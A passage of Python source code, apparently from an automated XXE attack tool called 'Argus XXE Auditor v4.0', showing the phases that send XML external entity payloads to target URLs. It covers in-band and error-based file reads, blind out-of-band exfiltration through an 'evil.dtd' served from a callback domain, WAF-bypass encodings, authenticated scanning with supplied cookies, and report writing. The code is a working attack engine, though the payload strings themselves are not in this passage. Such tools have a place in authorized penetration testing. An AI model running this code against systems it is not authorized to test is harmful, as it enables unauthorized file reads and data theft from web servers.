        severity = "CRITICAL"
    else:
        severity = "HIGH"

    confidence = 95 if technique == "inband" and hits else 85 if technique == "error" else 75

    return XXEFinding(
        target=surface.url,
        param=surface.param,
        param_location=surface.location,
        technique=technique,
        context=profile.family,
        severity=severity,
        confidence=confidence,
        confirmed=True,
        payload=body,
        evidence=f"File/metadata markers present: {', '.join(hits)}",
        file_read=hits[0] if hits else "",
        parser_family=profile.family,
        http_status=resp.status_code,
        auth_enabled=auth_enabled,
        details={
            "markers": hits,
            "status": resp.status_code,
            "parser_family": profile.family,
            "body_snippet": resp_body[:500],
        },
    )


def run_inband(
    session: Session, surface: XMLSurface, profile: ParserProfile,
    headers: Optional[dict], auth_enabled: bool,
) -> list[XXEFinding]:
    findings: list[XXEFinding] = []
    if not profile.capabilities.get("external_file"):
        return findings

    for payload in INBAND_PAYLOADS[:MAX_PAYLOADS_PER_SURFACE]:
        finding = _evaluate_payload(
            session, surface, profile, payload["body"],
            payload["markers"], headers, "inband", auth_enabled,
        )
        if finding:
            finding.details["label"] = payload["label"]
            findings.append(finding)
            return findings
    return findings


def run_error_based(
    session: Session, surface: XMLSurface, profile: ParserProfile,
    headers: Optional[dict], auth_enabled: bool,
) -> list[XXEFinding]:
    findings: list[XXEFinding] = []
    for payload in ERROR_PAYLOADS:
        if not profile.capabilities.get(payload["requires"]):
            continue
        finding = _evaluate_payload(
            session, surface, profile, payload["body"],
            payload["markers"], headers, "error", auth_enabled,
        )
        if finding:
            finding.details["label"] = payload["label"]
            findings.append(finding)
            return findings
    return findings


# ═════════════════════════════════════════════════════════════════════════════
#  PHASE 5 — BLIND OOB
# ═════════════════════════════════════════════════════════════════════════════

def run_oob(
    session: Session, surface: XMLSurface, profile: ParserProfile,
    oob: OOBCapture, headers: Optional[dict], auth_enabled: bool,
) -> list[XXEFinding]:
    findings: list[XXEFinding] = []
    if not oob.domain:
        return findings

    token = oob.new_token()
    oob_url = oob.token_url(token)
    if not oob_url:
        return findings

    ping_body = OOB_PING_TEMPLATE.format(oob=oob_url)
    resp = _send_xml(session, surface, ping_body, headers)
    time.sleep(REQUEST_SLEEP)
    if resp is None:
        return findings

    full_body = OOB_PAYLOAD_TEMPLATE.format(oob=oob_url)
    resp2 = _send_xml(session, surface, full_body, headers)
    time.sleep(REQUEST_SLEEP)

    findings.append(XXEFinding(
        target=surface.url,
        param=surface.param,
        param_location=surface.location,
        technique="oob",
        context=profile.family,
        severity="HIGH" if not oob.use_interactsh else "CRITICAL",
        confidence=60 if not oob.use_interactsh else 85,
        confirmed=False,
        payload=full_body,
        evidence=(
            f"External DTD payload sent to {oob_url}/evil.dtd — "
            + ("correlating OOB interactions" if oob.use_interactsh
               else "verify manually in your OOB dashboard")
        ),
        oob_token=token,
        parser_family=profile.family,
        http_status=resp2.status_code if resp2 else 0,
        auth_enabled=auth_enabled,
        details={
            "oob_url": oob_url,
            "evil_dtd": OOB_EVIL_DTD.replace("{oob}", oob_url),
            "mode": "interactsh" if oob.use_interactsh else "manual",
        },
    ))
    return findings


def confirm_oob_batch(
    oob: OOBCapture, findings: list[XXEFinding],
) -> list[XXEFinding]:
    if not oob.use_interactsh:
        return findings
    tokens = [f.oob_token for f in findings if f.oob_token]
    if not tokens:
        return findings

    log.info(f"    Waiting {OOB_CORRELATION_WAIT:.0f}s for OOB callbacks...")
    fired = oob.wait_and_check(tokens)

    for f in findings:
        if f.oob_token in fired:
            f.severity = "CRITICAL"
            f.confidence = 95
            f.confirmed = True
            f.oob_confirmed = True
            f.evidence = (
                f"Out-of-band callback received for token {f.oob_token} — "
                f"parser fetched the external DTD"
            )
            f.details["oob_confirmed"] = True

    return findings


# ═════════════════════════════════════════════════════════════════════════════
#  PHASE 6 — WAF BYPASS
# ═════════════════════════════════════════════════════════════════════════════

def run_bypass(
    session: Session, surface: XMLSurface, profile: ParserProfile,
    headers: Optional[dict], auth_enabled: bool,
) -> list[XXEFinding]:
    findings: list[XXEFinding] = []
    if not profile.capabilities.get("external_file"):
        return findings

    base_payload = INBAND_PAYLOADS[0]["body"]
    base_markers = INBAND_PAYLOADS[0]["markers"]

    for variant_bytes, label in _waf_variants_xml(base_payload):
        if surface.location == "query":
            if label in ("utf16be", "utf16le"):
                continue
            text = variant_bytes.decode("utf-8", "ignore")
            test_url = _inject_query_xml(surface.url, surface.param, text)
            resp = session.get(test_url, headers=headers or {})
        else:
            hdrs = {"Content-Type": "application/xml"}
            if headers:
                hdrs.update(headers)
            resp = session.post(surface.url, headers=hdrs, data=variant_bytes)
        time.sleep(REQUEST_SLEEP)
        if resp is None:
            continue
        body_text = _body(resp)
        hits = _match_markers(body_text, base_markers)
        if hits:
            findings.append(XXEFinding(
                target=surface.url,
                param=surface.param,
                param_location=surface.location,
                technique="bypass",
                context=profile.family,
                severity="CRITICAL",
                confidence=90,
                confirmed=True,
                payload=f"[{label}] {base_payload}",
                evidence=f"WAF bypass '{label}' triggered file read: {', '.join(hits)}",
                file_read=hits[0],
                parser_family=profile.family,
                bypass_used=label,
                http_status=resp.status_code,
                auth_enabled=auth_enabled,
                details={"variant": label, "markers": hits},
            ))
            return findings
    return findings


# ═════════════════════════════════════════════════════════════════════════════
#  DB SELF-SYNC
# ═════════════════════════════════════════════════════════════════════════════

def _self_sync(scan_id: int, findings: list[XXEFinding]) -> None:
    if not findings:
        return
    if not DB_AVAILABLE or DB is None:
        log.warning("  DB sync: db.py not importable")
        return
    if not _cfg("SYNC_TO_DB", True):
        log.info("  DB sync: SYNC_TO_DB=False, skipping")
        return
    if not _cfg("BRIDGE_ENABLED", False):
        log.info("  DB sync: BRIDGE_ENABLED=False, skipping")
        return
    if not getattr(DB, "available", False):
        log.warning("  DB sync: DB.available is False")
        return

    upsert = getattr(DB, "upsert_xxe_findings", None)
    if upsert is None:
        log.error(
            "  DB sync: db.py is missing upsert_xxe_findings(scan_id, rows). "
            "Add the method to enable xxe_findings sync."
        )
        return

    try:
        payloads = [f.to_dict() for f in findings]
        n = upsert(scan_id, payloads)
        if n is None:
            log.warning("  DB sync: bridge returned None")
        else:
            log.info(f"  DB sync: {n} row(s) upserted into xxe_findings (scan_id={scan_id})")
    except Exception as e:
        log.error(f"  DB sync: exception — {type(e).__name__}: {e}")


# ═════════════════════════════════════════════════════════════════════════════
#  PER-SURFACE ORCHESTRATION (worker unit — one thread per surface)
# ═════════════════════════════════════════════════════════════════════════════

def _process_surface(
    session: Session,
    surface: XMLSurface,
    headers: Optional[dict],
    oob: OOBCapture,
    auth_enabled: bool,
    test_error_based: bool,
    test_oob: bool,
    test_bypass: bool,
) -> dict:
    """Run all phases on one surface. Returns {surface, profile, findings, note}."""
    out = {
        "url": surface.url,
        "param": surface.param,
        "location": surface.location,
        "findings": [],
        "profile": None,
        "note": "",
    }

    try:
        profile = fingerprint_parser(session, surface, headers)
        out["profile"] = profile.to_dict()

        caps_str = ",".join(k for k, v in profile.capabilities.items() if v) or "none"
        out["note"] = f"parser={profile.family} caps=[{caps_str}]"

        inband = run_inband(session, surface, profile, headers, auth_enabled)
        out["findings"].extend(inband)
        if inband:
            out["note"] += f" | inband CONFIRMED ({inband[0].file_read})"
            return out

        if test_error_based:
            errors = run_error_based(session, surface, profile, headers, auth_enabled)
            out["findings"].extend(errors)
            if errors:
                out["note"] += f" | error CONFIRMED ({errors[0].file_read})"

        if test_oob:
            oob_findings = run_oob(session, surface, profile, oob, headers, auth_enabled)
            out["findings"].extend(oob_findings)
            if oob_findings:
                out["note"] += f" | OOB candidate ({oob_findings[0].oob_token[:8]}…)"

        if test_bypass and not inband:
            bypass = run_bypass(session, surface, profile, headers, auth_enabled)
            out["findings"].extend(bypass)
            if bypass:
                out["note"] += f" | bypass CONFIRMED ({bypass[0].bypass_used})"

        return out
    except Exception as e:
        out["note"] = f"error: {type(e).__name__}: {e}"
        log.debug(f"    surface error: {out['note']}")
        return out


# ═════════════════════════════════════════════════════════════════════════════
#  PUBLIC ENTRY POINT
# ═════════════════════════════════════════════════════════════════════════════

def run_xxe_scan(
    urls_file: Path,
    outdir: Path,
    *,
    headers: Optional[dict] = None,
    oob_domain: Optional[str] = None,
    use_interactsh: bool = False,
    test_error_based: bool = True,
    test_oob: bool = True,
    test_bypass: bool = True,
    max_surfaces: Optional[int] = None,
    rate_limit: Optional[int] = None,
    concurrency: Optional[int] = None,
    timeout: Optional[int] = None,
    scan_id: Optional[int] = None,
) -> Path:
    start = time.monotonic()

    settings = _xxe_settings()
    eff_rate     = rate_limit if rate_limit is not None else settings["rate_limit"]
    eff_conc     = concurrency if concurrency is not None else settings["concurrency"]
    eff_timeout  = timeout if timeout is not None else settings["timeout"]
    eff_max      = max_surfaces if max_surfaces is not None else settings["max_surfaces"]
    verify_tls   = settings["verify_tls"]

    # Merge caller-supplied headers with config-driven headers.
    merged_headers = _target_headers()
    if headers:
        for k, v in headers.items():
            merged_headers.setdefault(k, v)
    auth_enabled = bool(merged_headers)

    urls = _load_urls(urls_file)
    outdir.mkdir(parents=True, exist_ok=True)

    log.info(f"  Input  : {len(urls)} URL(s) from {urls_file.name}")
    log.info(f"  Config : rate={eff_rate}/s  concurrency={eff_conc}  "
             f"timeout={eff_timeout}s  max_surfaces={eff_max}")
    log.info(f"  Auth   : {'yes' if auth_enabled else 'no'}")

    if not urls:
        log.warning("  No URLs to test — writing empty report")
        return _write_empty_report(outdir, urls_file, start)

    oob = OOBCapture(domain=oob_domain, use_interactsh=use_interactsh)
    oob_active = oob.start()

    limiter = SharedRateLimiter(eff_rate)
    session = Session(
        limiter, merged_headers, eff_timeout, verify_tls=verify_tls,
    )

    # ── Phase 1: surface discovery ─────────────────────────────────────────
    log.info("")
    log.info("  Phase 1 — XML surface discovery")
    surfaces = discover_xml_surfaces(session, urls, merged_headers or None)
    if len(surfaces) > eff_max:
        log.warning(f"    Capping at {eff_max} surfaces (had {len(surfaces)})")
        surfaces = surfaces[:eff_max]

    surface_lines = [
        f"{s.method}\t{s.url}\t{s.param}\t{s.location}\t{s.hint or '-'}\t{s.accepts_xml}"
        for s in surfaces
    ]
    (outdir / "xxe_surface.txt").write_text(
        "\n".join(surface_lines) + ("\n" if surface_lines else "")
    )
    log.info(f"    {len(surfaces)} XML-accepting surface(s)")

    if not surfaces:
        log.warning("  No XML surfaces — writing empty report")
        oob.stop()
        return _write_empty_report(outdir, urls_file, start, total_input=len(urls))

    # ── Phases 2–6: per-surface (threaded) ─────────────────────────────────
    all_findings: list[XXEFinding] = []
    profiles: list[ParserProfile] = []
    results: list[dict] = []

    log.info("")
    log.info(f"  Testing {len(surfaces)} surface(s) (concurrency={eff_conc})")

    def _on_complete(i: int, out: dict) -> None:
        if out.get("profile"):
            # Rebuild a ParserProfile for the summaries
            p = ParserProfile(
                url=out["profile"]["url"],
                family=out["profile"]["family"],
                capabilities=out["profile"]["capabilities"],
                baseline_status=out["profile"]["baseline_status"],
                baseline_length=out["profile"]["baseline_length"],
            )
            profiles.append(p)

        all_findings.extend(out["findings"])
        results.append({
            "url": out["url"],
            "param": out["param"],
            "location": out["location"],
            "profile": out.get("profile"),
            "findings": len(out["findings"]),
            "note": out.get("note", ""),
        })

        if out["findings"]:
            top = out["findings"][0]
            log.info(
                f"    [{i:>3}/{len(surfaces)}] {top.technique:<8} "
                f"{top.severity:<8} {top.parser_family:<12} "
                f"{_redact_url(out['url'], 40)} param={out['param']}"
            )
        elif i % 20 == 0:
            log.info(f"    [{i:>3}/{len(surfaces)}] {out.get('note', '')[:80]}")

    try:
        with ThreadPoolExecutor(max_workers=eff_conc) as pool:
            futures = {
                pool.submit(
                    _process_surface, session, s, merged_headers or None,
                    oob, auth_enabled,
                    test_error_based, test_oob, test_bypass,
                ): i
                for i, s in enumerate(surfaces, 1)
            }
            done_count = 0
            for fut in as_completed(futures):
                done_count += 1
                try:
                    out = fut.result()
                    _on_complete(done_count, out)
                except Exception as e:
                    log.debug(f"    future error: {type(e).__name__}: {e}")

        # OOB correlation pass (after all surfaces finish)
        if oob_active and test_oob:
            all_findings = confirm_oob_batch(oob, all_findings)
    finally:
        oob.stop()

    # ── Dedupe + sort ──────────────────────────────────────────────────────
    seen: set[tuple] = set()
    deduped: list[XXEFinding] = []
    for f in all_findings:
        key = (f.target, f.param, f.param_location, f.technique,
               f.details.get("label", "") or f.bypass_used)
        if key not in seen:
            seen.add(key)
            f.auth_enabled = auth_enabled
            if not f.first_seen:
                f.first_seen = _db_now()
            deduped.append(f)

    SEV_ORDER = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "INFO": 4}
    deduped.sort(key=lambda f: (
        SEV_ORDER.get(f.severity, 5), 0 if f.confirmed else 1,
        -f.confidence, f.target,
    ))

    # ── Outputs ────────────────────────────────────────────────────────────
    elapsed = time.monotonic() - start
    by_severity: dict[str, int] = {
        "CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0, "INFO": 0,
    }
    by_technique: dict[str, int] = {}
    by_family: dict[str, int] = {}
    for f in deduped:
        by_severity[f.severity] = by_severity.get(f.severity, 0) + 1
        by_technique[f.technique] = by_technique.get(f.technique, 0) + 1
        if f.parser_family:
            by_family[f.parser_family] = by_family.get(f.parser_family, 0) + 1

    (outdir / "xxe_candidates.txt").write_text(
        "\n".join(
            f"{f.target}\t{f.param}\t{f.technique}\t{f.severity}\t"
            f"{f.confidence}\t{f.parser_family}\t"
            f"{'CONFIRMED' if f.confirmed else 'candidate'}\t{f.evidence[:140]}"
            for f in deduped
        ) + ("\n" if deduped else "")
    )

    confirmed = [
        f for f in deduped
        if f.confirmed and f.technique in ("inband", "error", "bypass")
    ]
    (outdir / "xxe_confirmed.txt").write_text(
        "\n".join(
            f"{f.target}\t{f.param}\t{f.technique}\t{f.parser_family}\t"
            f"{f.file_read or f.evidence[:100]}"
            for f in confirmed
        ) + ("\n" if confirmed else "")
    )

    oob_findings = [f for f in deduped if f.technique == "oob"]
    (outdir / "xxe_oob.txt").write_text(
        "\n".join(
            f"{f.target}\t{f.param}\t{f.oob_token}\t{f.severity}\t"
            f"{f.confidence}\t{'CONFIRMED' if f.oob_confirmed else 'candidate'}\t"
            f"{f.details.get('oob_url', '')}"
            for f in oob_findings
        ) + ("\n" if oob_findings else "")
    )

    fp_lines = [
        f"{p.url}\t{p.family}\t"
        f"{','.join(k for k, v in p.capabilities.items() if v)}"
        for p in profiles
    ]
    (outdir / "xxe_fingerprints.txt").write_text(
        "\n".join(fp_lines) + ("\n" if fp_lines else "")
    )

    report = {
        "schema_version": FINDING_SCHEMA_VERSION,
        "generated_at": datetime.now(timezone.utc).isoformat(),
        "elapsed_seconds": round(elapsed, 2),
        "input_file": str(urls_file),
        "scan_id": scan_id,
        "config": {
            "oob_domain":    oob_domain,
            "interactsh":    use_interactsh,
            "error_based":   test_error_based,
            "oob":           test_oob,
            "bypass":        test_bypass,
            "authenticated": auth_enabled,
            "rate_limit":    eff_rate,
            "concurrency":   eff_conc,
            "timeout":       eff_timeout,
            "max_surfaces":  eff_max,
            "verify_tls":    verify_tls,
        },
        "totals": {
            "urls_input":       len(urls),
            "surfaces_tested":  len(surfaces),
            "total_findings":   len(deduped),
            "confirmed":        len(confirmed),
            "oob_findings":     len(oob_findings),
            "oob_confirmed":    sum(1 for f in oob_findings if f.oob_confirmed),
            "critical":         by_severity["CRITICAL"],
            "high":             by_severity["HIGH"],
            "medium":           by_severity["MEDIUM"],
            "low":              by_severity["LOW"],
            "info":             by_severity["INFO"],
        },
        "summary": {
            "by_severity":  by_severity,
            "by_technique": dict(sorted(by_technique.items(), key=lambda kv: -kv[1])),
            "by_parser":    dict(sorted(by_family.items(), key=lambda kv: -kv[1])),
        },
        "surfaces": [s.to_dict() for s in surfaces],
        "profiles": [p.to_dict() for p in profiles],
        "results":  results,
        "findings": [f.to_dict() for f in deduped],
    }

    json_path = outdir / "xxe_findings.json"
    json_path.write_text(json.dumps(report, indent=2, ensure_ascii=False) + "\n")

    # ── DB self-sync ───────────────────────────────────────────────────────
    if scan_id is not None:
        _self_sync(scan_id, deduped)
    else:
        log.debug("  DB sync: no scan_id provided, skipping")

    # ── CLI summary ────────────────────────────────────────────────────────
    log.info("")
    log.info("  Outputs :")
    log.info(f"    {json_path.name:<28} {len(deduped):>5} finding(s)")
    log.info(f"    xxe_candidates.txt           {len(deduped):>5} candidate(s)")
    log.info(f"    xxe_confirmed.txt            {len(confirmed):>5} confirmed")
    log.info(f"    xxe_oob.txt                  {len(oob_findings):>5} OOB finding(s)")
    log.info(f"    xxe_surface.txt              {len(surfaces):>5} surface(s)")
    log.info(f"    xxe_fingerprints.txt         {len(profiles):>5} fingerprint(s)")

    log.info("")
    log.info(
        f"  Severity : CRITICAL={by_severity['CRITICAL']}  "
        f"HIGH={by_severity['HIGH']}  MEDIUM={by_severity['MEDIUM']}  "
        f"LOW={by_severity['LOW']}"
    )
    if by_technique:
        log.info("  Technique: " + " · ".join(f"{k}({v})" for k, v in by_technique.items()))
    if by_family:
        log.info("  Parser   : " + " · ".join(f"{k}({v})" for k, v in by_family.items()))

    if confirmed:
        log.info("")
        log.info("  Confirmed XXE findings (top 10):")
        for f in confirmed[:10]:
            log.info(
                f"    [{f.severity:<8}] {f.technique:<8} {f.parser_family:<12} "
                f"{f.param:<14} {_redact_url(f.target, 50)}"
            )

    oob_confirmed = [f for f in oob_findings if f.oob_confirmed]
    if oob_findings and not oob_confirmed and not use_interactsh:
        log.info("")
        log.info(f"  Blind OOB: {len(oob_findings)} candidate(s) — deploy manually:")
        log.info(f"    see xxe_oob.txt (evil.dtd templates included in details)")

    log.info("")
    log.info(f"  Completed in {elapsed:.1f}s")
    return json_path


def _write_empty_report(
    outdir: Path, input_file: Path, start: float, total_input: int = 0,
) -> Path:
    outdir.mkdir(parents=True, exist_ok=True)
    report = {
        "schema_version": FINDING_SCHEMA_VERSION,
        "generated_at": datetime.now(timezone.utc).isoformat(),
        "elapsed_seconds": round(time.monotonic() - start, 2),
        "input_file": str(input_file),
        "config": {},
        "totals": {
            "urls_input": total_input, "surfaces_tested": 0,
            "total_findings": 0, "confirmed": 0, "oob_findings": 0,
            "oob_confirmed": 0, "critical": 0, "high": 0, "medium": 0,
            "low": 0, "info": 0,
        },
        "summary": {"by_severity": {}, "by_technique": {}, "by_parser": {}},
        "surfaces": [],
        "profiles": [],
        "results": [],
        "findings": [],
    }
    path = outdir / "xxe_findings.json"
    path.write_text(json.dumps(report, indent=2) + "\n")
    for name in ("xxe_candidates.txt", "xxe_confirmed.txt", "xxe_oob.txt",
                 "xxe_surface.txt", "xxe_fingerprints.txt"):
        (outdir / name).write_text("")
    return path


# ═════════════════════════════════════════════════════════════════════════════
#  STANDALONE TEST
# ═════════════════════════════════════════════════════════════════════════════

if __name__ == "__main__":
    import argparse

    logging.basicConfig(
        level=logging.INFO,
        format="%(message)s",
        handlers=[logging.StreamHandler(sys.stdout)],
    )
    base = Path(__file__).resolve().parent.parent
    default_input = base / "output" / "urls_with_params.txt"
    if not default_input.exists():
        default_input = base / "output" / "all_urls.txt"
    out = base / "output"

    parser = argparse.ArgumentParser(
        description="Argus XXE Auditor v4.0 (standalone)"
    )
    parser.add_argument("--input", type=Path, default=default_input)
    parser.add_argument("--output", type=Path, default=out)
    parser.add_argument("--cookie", help="Session cookie")
    parser.add_argument("--header", action="append", default=[],
                        metavar="NAME=VALUE",
                        help="Extra header (repeatable)")
    parser.add_argument("--oob-domain",
                        help="OOB domain (Burp Collaborator / interactsh)")
    parser.add_argument("--interactsh", action="store_true",
                        help="Spawn interactsh-client")
    parser.add_argument("--no-error", action="store_true")
    parser.add_argument("--no-oob", action="store_true")
    parser.add_argument("--no-bypass", action="store_true")
    parser.add_argument("--max-surfaces", type=int, default=None)
    parser.add_argument("--rate-limit", type=int, default=None)
    parser.add_argument("--concurrency", type=int, default=None)
    parser.add_argument("--timeout", type=int, default=None)
    parser.add_argument("--scan-id", type=int, default=None,
                        help="DB scan ID for self-sync")
    args = parser.parse_args()

    headers: dict[str, str] = {}
    for h in args.header:
        if "=" in h:
            k, v = h.split("=", 1)
            headers[k.strip()] = v.strip()
    if args.cookie:
        headers["Cookie"] = args.cookie

    try:
        run_xxe_scan(
            args.input, args.output,
            oob_domain=args.oob_domain,
            use_interactsh=args.interactsh,
            headers=headers or None,
            test_error_based=not args.no_error,
            test_oob=not args.no_oob,
            test_bypass=not args.no_bypass,
            max_surfaces=args.max_surfaces,
            rate_limit=args.rate_limit,
            concurrency=args.concurrency,
            timeout=args.timeout,
            scan_id=args.scan_id,
        )
    except KeyboardInterrupt:
        log.warning("interrupted by user")
        sys.exit(130)
    except Exception as e:
        log.error(f"failed: {type(e).__name__}: {e}")
        sys.exit(1)
